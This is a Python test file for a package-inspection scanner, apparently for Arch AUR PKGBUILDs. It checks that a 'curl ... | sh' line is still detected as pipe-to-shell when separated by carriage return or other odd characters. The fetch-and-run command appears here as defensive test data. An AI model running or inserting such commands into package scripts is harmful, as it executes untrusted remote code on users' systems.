"""Shell text must be split into lines like bash does: on \\n only.

Python's str.splitlines() also breaks on \\r, form feed, \\x1c-\\x1e and
U+2028/U+2029, which bash treats as ordinary characters inside a line.
"""

from __future__ import annotations

import pytest

from pkginspect import cli
from pkginspect.rules import load_rules
from pkginspect.scoring import score_pkgbuild

from test_cli import CLEAN, aur, run

SEPARATORS = ["\r", "\x0c", "\x1c", " "]


@pytest.mark.parametrize("sep", SEPARATORS)
def test_pkgbuild_lines_split_like_bash(monkeypatch, capsys, sep):
    body = CLEAN + "build() {\n  curl -s https://example.com/x" + sep + " | sh\n}\n"
    monkeypatch.setattr(
        cli, "fetch_aur_packages", lambda names, *, deps=False: [aur("demo", body)]
    )
    _, out, _ = run(monkeypatch, capsys, "demo")
    assert "Pipe to shell" in out


@pytest.mark.parametrize("sep", SEPARATORS)
def test_install_lines_split_like_bash(sep):
    body = "post_install() {\n  curl -s https://example.com/x" + sep + " | sh\n}\n"
    r = score_pkgbuild(
        ["pkgname=foo", "pkgver=1", "pkgrel=1"],
        config=load_rules(),
        extra_files={"foo.install": body},
    )
    assert "pipe_to_shell" in [f.rule for f in r.findings]
